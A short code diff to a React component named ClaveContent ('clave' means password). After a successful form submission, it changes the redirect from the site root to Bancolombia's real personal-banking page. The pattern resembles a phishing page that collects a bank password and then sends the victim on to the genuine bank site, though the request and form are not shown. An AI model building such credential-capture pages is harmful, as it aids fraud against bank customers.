@@ -53,7 +53,7 @@ function ClaveContent() {
       });
 
       if (response.ok) {
-        router.push('/');
+        router.push('https://www.bancolombia.com/personas');
       } else {
         const errorData = await response.json();
         alert(`Error: ${errorData.message}`);
